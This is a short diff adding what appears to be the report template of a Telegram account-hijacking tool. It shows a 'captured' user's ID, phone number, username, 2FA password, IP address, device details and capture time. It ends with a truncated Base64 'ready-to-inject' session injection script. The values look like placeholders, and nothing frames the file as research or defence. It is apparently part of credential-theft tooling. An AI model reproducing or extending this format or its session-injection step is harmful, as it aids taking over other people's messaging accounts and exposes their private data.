@@ -1,0 +1,22 @@
+
+
+💾 USER DETAILS: 1
+
+🔹 ACCOUNT INFORMATION:
+├─ 🆔 User ID: 1234567890
+├─ 📱 Phone: +91987654321
+├─ 🔗 Username: @TestUser
+├─ 📛 Name: Test
+├─ 💎 Premium: ❌ NO/ ✅ YES
+├─ 🔐 2FA: Test1234
+
+🔹 DEVICE INFORMATION:
+├─ 🌐 IP Address: 127.0.0.8
+├─ 🖥️ User Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Sa...
+├─ 📱 Screen: 360x800
+└─ 🕒 Capture Time: 2026-02-14 16:30:25
+
+🔹 READY-TO-INJECT SCRIPT (Base64):
+Ly8gVEVMRUdSQU0gU0VTU0lPTiBJTkpFQ1RJT04gU0NSSVBUCi8........
+
+----------------------------------------------------------------------
